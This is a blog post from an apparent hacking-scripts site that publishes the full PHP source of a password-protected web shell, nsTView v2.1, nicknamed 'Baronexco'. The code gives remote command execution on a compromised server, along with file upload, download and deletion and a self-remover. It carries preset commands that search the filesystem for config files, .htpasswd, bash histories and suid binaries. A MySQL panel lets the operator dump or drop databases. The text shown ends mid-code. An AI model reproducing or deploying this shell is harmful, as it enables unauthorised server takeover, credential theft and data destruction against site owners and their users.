---
id: 202
title: Baronexco shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=202
permalink: /baronexco-shell/
categories:
  - PHP
tags:
  - PHP
---
I don&#8217;t know what this script is called, but the default password seems to be &#8216;baronexco&#8217;, so that&#8217;s the name I&#8217;ve give it.


### Baronexco Shell Source Code

{% highlight php %}<?
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);

###
####cfg
###
####
# use password  true / false #
$create_password = true;
$password = "baronexco";    // default password for nstview, you can change it.

# UNIX COMMANDS
# description (nst) command
# example: Shutdown (nst) shutdown -h now
$fast_commands = "
Show open ports (nst) netstat -an | grep LISTEN | grep tcp
last root (nst) last root
last (all users) (nst) last all
Find all config.php in / (nst) find / -type f -name config.php
Find all config.php in . (nst) find . -type f -name config.php
Find all admin.php in / (nst) find / -type f -name admin.php
Find all admin.php in . (nst) find . -type f -name admin.php
Find all config.inc.php in / (nst) find / -type f -name config.inc.php
Find all config.inc.php in . (nst) find . -type f -name config.inc.php
Find all config.inc in / (nst) find / -type f -name config.inc
Find all config.inc in . (nst) find . -type f -name config.inc
Find all config.dat in / (nst) find / -type f -name config.dat
Find all config.dat in . (nst) find . -type f -name config.dat
Find all config* in / (nst) find / -type f -name config*
Find all config* in . (nst) find . -type f -name config*
Find all pass* in / (nst) find / -type f -name pass*
Find all pass* in . (nst) find . -type f -name pass*
Find all .bash_history in / (nst) find / -type f -name .bash_history
Find all .bash_history in . (nst) find . -type f -name .bash_history
Find all .htpasswd  in / (nst) find / -type f -name .htpasswd
Find all .htpasswd  in . (nst) find . -type f -name .htpasswd
Find all writable dirs/files in / (nst) find / -perm -2 -ls
Find all writable dirs/files in . (nst) find . -perm -2 -ls
Find all suid files in / (nst) find / -type f -perm -04000 -ls
Find all suid files in . (nst) find . -type f -perm -04000 -ls
Find all sgid files in / (nst) find / -type f -perm -02000 -ls
Find all sgid files in . (nst) find . -type f -perm -02000 -ls
Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc
Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc
OS Version? (nst) sysctl -a | grep version
Kernel version? (nst) cat /proc/version
cat syslog.conf (nst) cat /etc/syslog.conf
Cat - Message of the day (nst) cat /etc/motd
Cat hosts (nst) cat /etc/hosts
Distrib name (nst) cat /etc/issue.net
Distrib name (2) (nst) cat /etc/*-realise
Display all process - wide output (nst) ps auxw
Display all your process (nst) ps ux
Interfaces (nst) ifconfig
CPU? (nst) cat /proc/cpuinfo
RAM (nst) free -m
HDD space (nst) df -h
List of Attributes (nst) lsattr -a
Mount options (nst) cat /etc/fstab
Is cURL installed? (nst) which curl
Is wGET installed? (nst) which wget
Is lynx installed? (nst) which lynx
Is links installed? (nst) which links
Is fetch installed? (nst) which fetch
Is GET installed? (nst) which GET
Is perl installed? (nst) which perl
Where is apache (nst) whereis apache
Where is perl (nst) whereis perl
locate proftpd.conf (nst) locate proftpd.conf
locate httpd.conf (nst) locate httpd.conf
locate my.conf (nst) locate my.conf
locate psybnc.conf (nst) locate psybnc.conf
";



# WINDOWS COMMANDS
# description (nst) command
# example: Delete autoexec.bat (nst) del c:\autoexec.bat
$fast_commands_win = "
OS Version (nst) ver
Tasklist  (nst) tasklist
Attributes in . (nst) attrib
Show open ports (nst) netstat -an
";






###
###
###ver
###
###
$ver= "v2.1";

###
###
###
###
###
####
$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
else $ip = $_SERVER['REMOTE_ADDR'];
$ip=htmlspecialchars($ip);

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
&lt;title&gt;nsTView $ver:: nst.void.ru&lt;/title&gt;
&lt;center&gt;
&lt;table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black&gt;&lt;tr&gt;&lt;td&gt;
&lt;font size=1 face=verdana&gt;&lt;center&gt;
&lt;b&gt;nsTView $ver :: &lt;a href=http://nst.void.ru style='text-decoration:none;'&gt;&lt;font color=black&gt;nst.void.ru&lt;/font&gt;&lt;/a&gt;&lt;br&gt;&lt;/b&gt;
&lt;/center&gt;
&lt;form method=post&gt;
Password:&lt;br&gt;
&lt;input type=password name=pass size=30 tabindex=1&gt;
&lt;/form&gt;
&lt;b&gt;Host:&lt;/b&gt; ".$_SERVER["HTTP_HOST"]."&lt;br&gt;
&lt;b&gt;IP:&lt;/b&gt; ".gethostbyname($_SERVER["HTTP_HOST"])."&lt;br&gt;
&lt;b&gt;Your ip:&lt;/b&gt; ".$ip."
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
");}

}
$d=$_GET['d'];

function adds($editf){
#if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
#}
return $editf;
}
function adds2($editf){
if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
}
return $editf;
}

$f   = "nst_sql.txt";
$f_d = $_GET['f_d'];

if($_GET['download']){
$download=$_GET['download'];
header("Content-disposition: attachment; filename=\"$download\";");
readfile("$d/$download");
exit;}

if($_GET['dump_download']){
header("Content-disposition: attachment; filename=\"$f\";");
header("Content-length: ".filesize($f_d."/".$f));
header("Expires: 0");
readfile($f_d."/".$f);
if(is_writable($f_d."/".$f)){
unlink($f_d."/".$f);
}
die;
}


$images=array(".gif",".jpg",".png",".bmp",".jpeg");
$whereme=getcwd();
@$d=@$_GET['d'];
$copyr = "&lt;center&gt;&lt;a href=http://nst.void.ru target=_blank&gt;nsTView $ver&lt;br&gt;o... Network security team ...o&lt;/a&gt;";
$php_self=@$_SERVER['PHP_SELF'];
if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
if(!isset($d)){$d=$whereme;}
$d=str_replace("\\","/",$d);
if(@$_GET['p']=="info"){
@phpinfo();
exit;}
if(@$_GET['img']=="1"){
@$e=$_GET['e'];
header("Content-type: image/gif");
readfile("$d/$e");
}
if(@$_GET['getdb']=="1"){
header('Content-type: application/plain-text');
header('Content-Disposition: attachment; filename=nst-mysql-damp.htm');
}
print "&lt;title&gt;nsT View $ver&lt;/title&gt;
&lt;style&gt;
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
SCROLLBAR-FACE-COLOR: #363d4e;
SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;
SCROLLBAR-SHADOW-COLOR: #363d4e;
SCROLLBAR-ARROW-COLOR: #363d4e;
SCROLLBAR-TRACK-COLOR: #91AAFF
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:link {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:hover {
COLOR: #FF0C0B;
TEXT-DECORATION: none
}
A:active {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:visited {
TEXT-DECORATION: none
}
&lt;/style&gt;
&lt;script&gt;
function ShowOrHide(d1, d2) {
if (d1 != '') DoDiv(d1);
if (d2 != '') DoDiv(d2);}

function DoDiv(id) {
var item = null;
if (document.getElementById) {
item = document.getElementById(id);
} else if (document.all){
item = document.all[id];
} else if (document.layers){
item = document.layers[id];}
if (!item) {}
else if (item.style) {
if (item.style.display == \"none\"){ item.style.display = \"\"; }
else {item.style.display = \"none\"; }
}else{ item.visibility = \"show\"; }}

function cwd(text){
document.sh311Form.sh3.value+=\" \"+ text;
document.sh311Form.sh3.focus();
}


&lt;/script&gt;
";
print "&lt;body vlink=#0006DE&gt;
&lt;table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center&gt;
&lt;tr&gt;&lt;td&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt;";
$expl=explode("/",$d);
$coun=count($expl);
if($os=="unix"){echo "&lt;a href='$php_self?d=/'&gt;/&lt;/a&gt;";}
else{
        echo "&lt;a href='$php_self?d=$expl[0]'&gt;$expl[0]/&lt;/a&gt;";}
for($i=1; $i&lt;$coun; $i++){
        @$xx.=$expl[$i]."/";
$sls="&lt;a href='$php_self?d=$expl[0]/$xx'&gt;$expl[$i]&lt;/a&gt;/";
$sls=str_replace("//","/",$sls);
$sls=str_replace("/'&gt;&lt;/a&gt;/","/'&gt;&lt;/a&gt;",$sls);
print $sls;
}
if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}
if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}
echo "&lt;/td&gt;&lt;/tr&gt;";
if($os=="unix"){ echo "
&lt;tr&gt;&lt;td&gt;&lt;b&gt;id:&lt;/b&gt; ".@exec('id')."&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;b&gt;uname -a:&lt;/b&gt; ".@exec('uname -a')."&lt;/td&gt;&lt;/tr&gt;";} echo"
&lt;tr&gt;&lt;td&gt;&lt;b&gt;Your IP: [&lt;font color=#5F3CC1&gt;$ip&lt;/font&gt;] Server IP: [&lt;font color=#5F3CC1&gt;".gethostbyname($_SERVER["HTTP_HOST"])."&lt;/font&gt;] Server &lt;a href=# title='Host.Domain'&gt;H.D.&lt;/a&gt;: [&lt;font color=#5F3CC1&gt;".$_SERVER["HTTP_HOST"]."&lt;/font&gt;]&lt;/b&gt;&lt;br&gt;
[&lt;b&gt;Safe mode:&lt;/b&gt; $safe_m] [&lt;b&gt;Register globals:&lt;/b&gt; $reg_g]&lt;br&gt;
[&lt;a href=# onClick=location.href=\"javascript:history.back(-1)\"&gt;Back&lt;/a&gt;]
[&lt;a href='$php_self'&gt;Home&lt;/a&gt;]
[&lt;a href='$php_self?d=$d&sh311=1'&gt;Shell (1)&lt;/a&gt; &lt;a href='$php_self?d=$d&sh311=2'&gt;(2)&lt;/a&gt;]
[&lt;a href='$php_self?d=$d&t=upload'&gt;Upload&lt;/a&gt;]
[&lt;a href='$php_self?t=tools'&gt;Tools&lt;/a&gt;]
[&lt;a href='$php_self?p=info'&gt;PHPinfo&lt;/a&gt;]
[&lt;a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'&gt;DEL Folder&lt;/a&gt;]
[&lt;a href='$php_self?p=sql'&gt;SQL&lt;/a&gt;]
[&lt;a href='$php_self?p=selfremover'&gt;Self Remover&lt;/a&gt;]
&lt;/td&gt;&lt;/tr&gt;
";
if($os=="win"){ echo "
&lt;tr&gt;&lt;td bgcolor=white&gt;
&lt;center&gt;&lt;font face=wingdings size=2&gt;&lt;&lt;/font&gt;
&lt;a href='$php_self?d=a:/'&gt;A&lt;/a&gt;
&lt;a href='$php_self?d=b:/'&gt;B&lt;/a&gt;
&lt;a href='$php_self?d=c:/'&gt;C&lt;/a&gt;
&lt;a href='$php_self?d=d:/'&gt;D&lt;/a&gt;
&lt;a href='$php_self?d=e:/'&gt;E&lt;/a&gt;
&lt;a href='$php_self?d=f:/'&gt;F&lt;/a&gt;
&lt;a href='$php_self?d=g:/'&gt;G&lt;/a&gt;
&lt;a href='$php_self?d=h:/'&gt;H&lt;/a&gt;
&lt;a href='$php_self?d=i:/'&gt;I&lt;/a&gt;
&lt;a href='$php_self?d=j:/'&gt;J&lt;/a&gt;
&lt;a href='$php_self?d=k:/'&gt;K&lt;/a&gt;
&lt;a href='$php_self?d=l:/'&gt;L&lt;/a&gt;
&lt;a href='$php_self?d=m:/'&gt;M&lt;/a&gt;
&lt;a href='$php_self?d=n:/'&gt;N&lt;/a&gt;
&lt;a href='$php_self?d=o:/'&gt;O&lt;/a&gt;
&lt;a href='$php_self?d=p:/'&gt;P&lt;/a&gt;
&lt;a href='$php_self?d=q:/'&gt;Q&lt;/a&gt;
&lt;a href='$php_self?d=r:/'&gt;R&lt;/a&gt;
&lt;a href='$php_self?d=s:/'&gt;S&lt;/a&gt;
&lt;a href='$php_self?d=t:/'&gt;T&lt;/a&gt;
&lt;a href='$php_self?d=u:/'&gt;U&lt;/a&gt;
&lt;a href='$php_self?d=v:/'&gt;V&lt;/a&gt;
&lt;a href='$php_self?d=w:/'&gt;W&lt;/a&gt;
&lt;a href='$php_self?d=x:/'&gt;X&lt;/a&gt;
&lt;a href='$php_self?d=y:/'&gt;Y&lt;/a&gt;
&lt;a href='$php_self?d=z:/'&gt;Z&lt;/a&gt;
&lt;/td&gt;&lt;/tr&gt;";}else{echo "&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;";}
print "&lt;tr&gt;&lt;td&gt;
:: &lt;a href='$php_self?d=$d&mkdir=1'&gt;Create folder&lt;/a&gt; ::
&lt;a href='$php_self?d=$d&mkfile=1'&gt;Create file&lt;/a&gt; ::
&lt;a href='$php_self?d=$d&read_file_safe_mode=1'&gt;Read file if safe mode is On&lt;/a&gt; ::";
if($os=="unix"){
print "&lt;a href='$php_self?d=$d&ps_table=1'&gt;PS table&lt;/a&gt; ::";
}
print "&lt;/td&gt;&lt;/tr&gt;";





if($_GET['p']=="ftp"){
print "&lt;tr&gt;&lt;td&gt;";



print "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
print $copyr;
exit;
}










if(@$_GET['p']=="sql"){
print "&lt;tr&gt;&lt;td&gt;";

####

$f_d = $_GET['f_d'];
if(!isset($f_d)){$f_d=".";}
if($f_d==""){$f_d=".";}

$php_self=$_SERVER['PHP_SELF'];
$delete_table=$_GET['delete_table'];
$tbl=$_GET['tbl'];
$from=$_GET['from'];
$to=$_GET['to'];
$adress=$_POST['adress'];
$port=$_POST['port'];
$login=$_POST['login'];
$pass=$_POST['pass'];
$adress=$_GET['adress'];
$port=$_GET['port'];
$login=$_GET['login'];
$pass=$_GET['pass'];
$conn=$_GET['conn'];
if(!isset($adress)){$adress="localhost";}
if(!isset($login)){$login="root";}
if(!isset($pass)){$pass="";}
if(!isset($port)){$port="3306";}
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}


?>
&lt;style&gt;
table,td{
color: black;
font-face: verdana;
font-size: 11px;

}
&lt;/style&gt;
&lt;font color=black face=verdana size=1&gt;
<? if(!$conn){ ?>

&lt;!-- table 1 --&gt;
&lt;table bgcolor=#D7FFA8&gt;
&lt;tr&gt;&lt;td valign=top&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;form&gt;&lt;input name=adress value='<?=$adress?>' size=20&gt;&lt;input name=port value='<?=$port?>' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;Td valign=top&gt;Login: &lt;/td&gt;&lt;td&gt;&lt;input name=login value='<?=$login?>' size=10&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;Td valign=top&gt;Pass:&lt;/td&gt;&lt;td&gt; &lt;input name=pass value='<?=$pass?>' size=10&gt;&lt;input type=hidden name=p value=sql&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=conn value=Connect&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;<?}?>
&lt;tr&gt;&lt;td valign=top&gt;<? if($conn){ echo "&lt;b&gt;PHP v".@phpversion()."&lt;br&gt;mySQL v".@mysql_get_server_info()."&lt;br&gt;";}?>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;!-- end of table 1 --&gt;


<?
$conn=$_GET['conn'];
$adress=$_GET['adress'];
$port=$_GET['port'];
$login=$_GET['login'];
$pass=$_GET['pass'];
if($conn){

$serv = @mysql_connect($adress.":".$port, $login,$pass) or die("&lt;font color=red&gt;Error: ".mysql_error()."&lt;/font&gt;");
if($serv){$status="Connected. :: &lt;a href='$php_self?p=sql'&gt;Log out&lt;/a&gt;";}else{$status="Disconnected.";}
print "&lt;b&gt;&lt;font color=green&gt;Status: $status&lt;br&gt;&lt;br&gt;"; # #D7FFA8
print "&lt;table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8&gt;&lt;tr&gt;&lt;td valign=top&gt;";
print "&lt;br&gt;&lt;font color=red&gt;[db]&lt;/font&gt;&lt;Br&gt;";
print "&lt;font color=white&gt;";
$res = mysql_list_dbs($serv);
while ($str=mysql_fetch_row($res)){
print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")'&gt;[DEL]&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'&gt;[DUMP]&lt;/a&gt;&lt;/a&gt; &lt;b&gt;&lt;a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'&gt;$str[0]&lt;/a&gt;&lt;/b&gt;&lt;br&gt;";
$tc++;
}
$baza=$_GET['baza'];
$db=$_GET['db'];
print "&lt;font color=red&gt;[Total db: $tc]&lt;/font&gt;&lt;br&gt;";
if($baza){
print "&lt;div align=left&gt;&lt;font color=green&gt;db: [$db]&lt;/div&gt;&lt;/font&gt;&lt;br&gt;";
$result=@mysql_list_tables($db);
while($str=@mysql_fetch_array($result)){
$c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
$records=mysql_fetch_array($c);

if(strlen($str[0])&gt;$s4ot){$s4ot=strlen($str[0]);}
if($records[0]=="0"){
print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'&gt;[D]&lt;/a&gt;&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[$records[0]]&lt;/font&gt; &lt;a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'&gt;$str[0]&lt;/a&gt;&lt;br&gt;";
}else{
print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'&gt;[D]&lt;/a&gt;&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[$records[0]]&lt;/font&gt; &lt;a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'&gt;$str[0]&lt;/a&gt;&lt;br&gt;";
}
mysql_free_result($c);
$total_t++;
}
print "&lt;br&gt;&lt;B&gt;&lt;font color=red&gt;Total tables: $total_t&lt;/font&gt;&lt;/b&gt;";
                                print "&lt;pre&gt;";
for($i=0; $i&lt;$s4ot+10; $i++){print "&nbsp;";}
                                print "&lt;/pre&gt;";
} #end baza




# delete table
if(isset($delete_table)){
mysql_select_db($_GET['db']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_query("DROP TABLE IF EXISTS $delete_table") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Table [ $delete_table ] :: Deleted success!&lt;/font&gt;&lt;/b&gt;";
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1\"&gt;";
}
# end of delete table

# delete database
if(isset($_GET['delete_db'])){
mysql_drop_db($_GET['delete_db']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Database ".$_GET['delete_db']." :: Deleted Success!";
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\"&gt;";
}
# end of delete database

# delete row
if(isset($_POST['delete_row'])){
$_POST['delete_row'] = base64_decode($_POST['delete_row']);
mysql_query("DELETE FROM ".$_GET['tbl']." WHERE ".$_POST['delete_row']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
$del_result = "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Deleted Success!&lt;br&gt;".$_POST['delete_row'];
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
}
# end of delete row


$vn=$_GET['vn'];
print "&lt;/td&gt;&lt;td valign=top&gt;";
print "&lt;font color=green&gt;Database: $db =&gt; $vn&lt;/font&gt;";

# edit row
if(isset($_POST['edit_row'])){
$edit_row=base64_decode($_POST['edit_row']);

$r_edit = mysql_query("SELECT * FROM $tbl WHERE $edit_row") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;br&gt;&lt;br&gt;
       &lt;table border=0 cellpadding=1 cellspacing=1&gt;&lt;tr&gt;
       &lt;td&gt;&lt;b&gt;Row&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
print  "&lt;form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."'&gt;";
print  "&lt;input type=hidden name=edit_row value='".$_POST['edit_row']."'&gt;";
print " &lt;input type=radio name=upd value=update checked&gt;Update&lt;br&gt;
        &lt;input type=radio name=upd value=insert&gt;Insert new&lt;br&gt;&lt;br&gt;";


$i=0;
while($mn = mysql_fetch_array($r_edit, MYSQL_ASSOC)){
foreach($mn as $key =&gt;$val){
$type  = mysql_field_type($r_edit, $i);
$len  = mysql_field_len($r_edit, $i);
$del .= "`$key`='".adds($val)."' AND ";
$c=strlen($val);
$val=htmlspecialchars($val, ENT_NOQUOTES);
$str=" &lt;textarea name='$key' cols=39 rows=5&gt;$val&lt;/textarea&gt; ";
$buff .= "&lt;tr&gt;&lt;td bgcolor=silver&gt;&lt;b&gt;$key&lt;/b&gt;&lt;br&gt;&lt;font color=green&gt;(&lt;b&gt;$type($len)&lt;/b&gt;)&lt;/font&gt;&lt;/td&gt;&lt;td&gt;$str&lt;/td&gt;&lt;/tr&gt;";
$i++;
}

}
$delstring=base64_encode($del);
print "&lt;input type=hidden name=delstring value=\"$delstring\"&gt;";
print "$buff&lt;/table&gt;&lt;br&gt;";
print "&lt;br&gt;";
if(!$_POST['makeupdate']){print "&lt;input type=submit value=Update name=makeupdate&gt;&lt;/form&gt;";}




if($_POST['makeupdate']){
if($_POST['upd']=='update'){
preg_match_all("/name='(.*?)'\scols=39\srows=5&gt;(.*?)&lt;\/textarea&gt;/i",$buff,$matches3);
$delstring=$_POST['delstring'];
$delstring=base64_decode($delstring);
$delstring = substr($delstring, 0, strlen($delstring)-5);

for($i=0; $i&lt;count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',";
}
$total_str = substr_replace($total_str,"",-1);
$up_string = "UPDATE `$tbl` SET $total_str WHERE $delstring";
$up_string = htmlspecialchars($up_string, ENT_NOQUOTES);
print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$up_string\";&lt;br&gt;&lt;br&gt;";
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
mysql_query($up_string) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
}#end of make update



if($_POST['upd']=='insert'){
preg_match_all("/name='(.*?)'\scols=39\srows=5&gt;(.*?)&lt;\/textarea&gt;/i",$buff,$matches3);
$delstring=$_POST['delstring'];
$delstring=base64_decode($delstring);
$delstring = substr($delstring, 0, strlen($delstring)-5);

for($i=0; $i&lt;count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
}

$total_str = ",,".$total_str;

preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);

for($i=0; $i&lt;count($matches4[1]); $i++){
        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
        $total_m_i .= "`".$matches4[1][$i]."`,";
        $total_m_x .= "'".$matches4[2][$i]."',";
}
$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);

$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
mysql_query($make_insert) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$make_insert\";&lt;br&gt;&lt;br&gt;";
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
}#end of insert
}#end of update
}
# end of edit row


# insert new line
if($_GET['ins_new_line']){
$qn = mysql_query('SHOW FIELDS FROM '.$tbl) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."&ins_new_line=1'&gt;
Insert new line in &lt;b&gt;$tbl&lt;/b&gt; table&lt;/b&gt;&lt;Br&gt;&lt;br&gt;";
print "&lt;table&gt;";
while ($new_line = mysql_fetch_array($qn, MYSQL_ASSOC)) {
foreach ($new_line as $key =&gt;$next) {
$buff .= "$next ";
}
$expl=explode(" ",$buff);
$buff2 .= $expl[0]." ";
print "&lt;tr&gt;&lt;td bgcolor=silver&gt;&lt;b&gt;$expl[0]&lt;/b&gt;&lt;br&gt;&lt;font color=green&gt;(&lt;b&gt;$expl[1]&lt;/b&gt;)&lt;/font&gt;&lt;/td&gt;
&lt;td&gt;&lt;textarea name='$expl[0]' cols=39 rows=5&gt;&lt;/textarea&gt;
&lt;/td&gt;&lt;/tr&gt;";
unset($buff);
}
print "&lt;/table&gt;
&lt;center&gt;&lt;input type=submit value=Insert name=mk_ins&gt;&lt;/form&gt;&lt;/center&gt;";
if($_POST['mk_ins']){
preg_match_all("/(.*?)\s/i",$buff2,$matches3);
for($i=0; $i&lt;count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
}

$total_str = ",,".$total_str;
preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);

for($i=0; $i&lt;count($matches4[1]); $i++){
        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
        $total_m_i .= "`".$matches4[1][$i]."`,";
        $total_m_x .= "'".$matches4[2][$i]."',";
}
$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);

$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
mysql_query($make_insert) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$make_insert\";&lt;br&gt;&lt;br&gt;";
print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
}#end of mk ins
}#end of ins new line






if(isset($_GET['rename_table'])){
$rename_table=$_GET['rename_table'];
print "&lt;br&gt;&lt;br&gt;Rename &lt;b&gt;$rename_table&lt;/b&gt; to&lt;br&gt;&lt;br&gt;
&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$rename_table'&gt;
&lt;input name=new_name size=30&gt;&lt;center&gt;&lt;br&gt;
&lt;input type=submit value=Rename&gt;&lt;/center&gt;
&lt;/form&gt;
";

if(isset($_POST['new_name'])){
mysql_select_db($db) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
mysql_query("RENAME TABLE $rename_table TO ".$_POST['new_name']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
print "&lt;br&gt;&lt;font color=green&gt;Table &lt;b&gt;$rename_table&lt;/b&gt; renamed to &lt;b&gt;".$_POST['new_name']."&lt;/b&gt;&lt;/font&gt;";
print "&lt;meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&db=$db\"&gt;";
}

}#end of rename


# dump table
if($_GET['dump']){
